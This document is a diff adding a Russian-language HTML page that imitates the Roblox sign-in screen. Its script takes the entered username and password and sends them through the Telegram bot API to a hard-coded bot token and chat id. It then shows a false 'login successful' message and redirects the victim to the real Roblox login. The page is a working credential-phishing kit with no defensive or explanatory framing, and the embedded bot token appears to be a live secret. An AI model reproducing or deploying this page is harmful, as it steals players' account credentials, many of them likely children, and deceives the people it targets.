@@ -1,0 +1,45 @@
+    <!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox - Вход</title>
+    <style>
+        body { background: #1a1a2e; font-family: Arial; text-align: center; padding-top: 50px; margin: 0; }
+        .box { background: white; width: 320px; margin: auto; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
+        input { width: 90%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { background: #00b341; color: white; padding: 12px; width: 95%; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }
+        button:hover { background: #009933; }
+        img { width: 150px; }
+        a { color: #0072b1; text-decoration: none; font-size: 14px; }
+        p { margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Roblox_Logo_2022.svg/2560px-Roblox_Logo_2022.svg.png">
+        <h2 style="color: #1a1a2e;">Вход</h2>
+        <input type="text" id="user" placeholder="Имя пользователя"><br>
+        <input type="password" id="pass" placeholder="Пароль"><br>
+        <button onclick="send()">Войти</button>
+        <p><a href="#">Забыли пароль?</a> | <a href="#">Регистрация</a></p>
+    </div>
+    <script>
+        function send() {
+            let u = document.getElementById('user').value;
+            let p = document.getElementById('pass').value;
+            if (u === '' || p === '') {
+                alert('Заполните все поля!');
+                return;
+            }
+            let token = "8847775639:AAFbsxzyX_5_arZ65JJv8lhzYxuuJiUj7xQ";
+            let chat_id = 6929974696;
+            let message = "Логин: " + u + " | Пароль: " + p;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
+                .then(() => {
+                    alert('Вход выполнен успешно!');
+                    window.location = 'https://www.roblox.com/login';
+                })
+                .catch(() => alert('Ошибка, попробуйте позже'));
+        }
+    </script>
+</body>
+</html>           
